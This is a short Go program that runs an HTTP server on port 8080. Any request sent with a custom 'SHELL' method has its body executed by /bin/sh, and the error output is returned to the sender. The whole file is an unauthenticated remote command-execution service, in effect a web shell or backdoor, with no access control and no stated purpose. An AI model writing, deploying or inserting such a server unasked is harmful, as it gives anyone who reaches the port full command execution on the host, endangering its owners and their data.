package main

import (
	"bytes"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/exec"
)

func main() {
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		switch r.Method {
		case "SHELL":
			cmd := exec.Command("/bin/sh")
			cmd.Stdin = r.Body
			cmd.Stdout = os.Stdout
			var out bytes.Buffer
			cmd.Stderr = &out
			err := cmd.Run()
			if err != nil {
				if _, ok := err.(*exec.ExitError); ok {
					w.WriteHeader(http.StatusBadRequest)
				} else {
					w.WriteHeader(http.StatusInternalServerError)
				}
				w.Write(out.Bytes())
				fmt.Fprintf(w, "%s\n", err)
				return
			}
			w.WriteHeader(http.StatusOK)
			w.Write(out.Bytes())
		default:
			w.WriteHeader(http.StatusMethodNotAllowed)
			fmt.Fprintf(w, "Method not allowed\n")
		}
	})

	log.Println(http.ListenAndServe(":8080", nil))
}
